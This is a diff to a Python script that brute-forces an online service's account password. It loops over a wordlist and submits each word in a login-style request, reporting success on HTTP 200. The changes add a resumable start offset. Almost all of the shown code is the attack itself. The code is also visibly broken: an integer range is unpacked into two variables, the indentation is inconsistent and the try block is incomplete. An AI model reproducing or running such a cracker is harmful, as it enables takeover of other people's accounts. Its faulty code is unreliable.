@@ -62,17 +62,24 @@ wordlist = input(yellow + " > wordlist: " + reset)
 
 print()
 
+print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
 start_point = input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)
 
+try:
+    start_point = int(start_point)
+except ValueError:
+    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
+    start_point = 0
 
-print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
 i = input(yellow + " > #: " + reset)
 password = None
 
 def brute_force(user, password, wordlist, start_point=0):
     call(["clear"])
+    
     with open(wordlist, 'r') as f:
         words = f.readlines()
+        
     for i, word in range(start_point, len(words)):
         word = words[i].strip()
         print(adv, f"cracking account...",f"{i+1}/{len(words)}", reset)
@@ -106,18 +113,18 @@ def brute_force(user, password, wordlist, start_point=0):
               "apple_email": "",
               "apple_code": "",
               "mix_string": word
-        })
-        if response.status_code == 200:
+           })
+           if response.status_code == 200:
                 print()
                 print(green + f" success! password is {word}" + reset)
                 break
             else:
                 print()
                 print(red + f"failed! password not found in {wordlist}" + reset)
-        except Exception as e:
-            print()
-            print(red + f"Error: {e}. Pausing for user input..." + reset)
-            input("Press Enter to resume...")
+          except Exception as e:
+             print()
+             print(red + f"Error: {e}. Pausing for user input..." + reset)
+             input("Press Enter to resume...")
 
 
-brute_force(user, password, wordlist, start_point=0)
+brute_force(user, password, wordlist, start_point)
